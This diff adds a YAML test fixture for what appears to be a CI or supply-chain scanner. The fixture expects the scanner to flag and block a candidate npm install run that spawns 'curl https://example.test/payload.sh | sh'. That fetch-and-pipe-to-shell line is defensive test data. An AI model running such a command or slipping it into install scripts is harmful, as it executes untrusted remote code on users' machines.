@@ -1,0 +1,35 @@
+name: block_network_fetch_during_install
+description: Candidate introduces a new install-time network fetch that should be blocked.
+rules: rules/default.yml
+expected_exit_code: 0
+want:
+  technical_verdict: suspicious_diff
+  operator_recommendation: block
+  finding_kinds:
+    - new_process_exec
+  rule_categories:
+    - review
+    - hard_block
+    - hard_block
+baseline:
+  stable: true
+  runs:
+    - exit_code: 0
+      steps:
+        - name: install dependency
+          intent: install
+          command: npm install
+          stdout: installed cleanly
+candidate:
+  stable: true
+  runs:
+    - exit_code: 0
+      steps:
+        - name: install dependency
+          intent: install
+          command: npm install
+          stdout: installed cleanly
+      events:
+        - kind: process.exec
+          step: install dependency
+          command: curl https://example.test/payload.sh | sh
